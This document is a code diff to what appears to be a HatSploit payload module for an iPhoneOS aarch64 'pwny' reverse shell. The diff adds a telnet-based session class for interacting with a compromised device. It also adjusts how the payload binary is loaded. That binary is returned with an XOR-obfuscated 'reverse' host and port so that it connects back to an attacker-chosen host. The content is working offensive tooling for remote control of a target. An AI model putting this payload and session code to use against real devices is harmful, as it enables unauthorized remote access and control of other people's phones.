@@ -9,7 +9,32 @@ from hatsploit.payload import Payload
 from hatsploit.utils.string import StringTools
 from hatsploit.utils.tcp import TCPClient
 
-from data.pwny.iphoneos.session import HatSploitSession
+from hatsploit.session import Session
+from hatsploit.utils.telnet import TelnetClient
+
+
+class HatSploitSession(Session, TelnetClient):
+    client = None
+
+    details = {
+        'Platform': "iphoneos",
+        'Type': "pwny"
+    }
+
+    def open(self, client):
+        self.client = self.open_telnet(client)
+
+    def close(self):
+        self.client.disconnect()
+
+    def send_command(self, command, output=False, timeout=10):
+        output = self.client.send_command(command + '\n', output, timeout)
+        if output:
+            output = output.replace('pwny > ', '')
+        return output
+
+    def interact(self):
+        self.client.interact()
 
 
 class HatSploitPayload(Payload, StringTools, TCPClient):
@@ -52,7 +77,7 @@ class HatSploitPayload(Payload, StringTools, TCPClient):
         local_port = self.xor_string(local_port)
 
         self.output_process("Generating payload...")
-        with open('data/pwny/iphoneos/aarch64/pwny', 'rb') as f:
+        with open(self.data_path + 'pwny/iphoneos/aarch64/pwny', 'rb') as f:
             payload = f.read()
 
         return payload, f"reverse '{local_host}' '{local_port}'", HatSploitSession
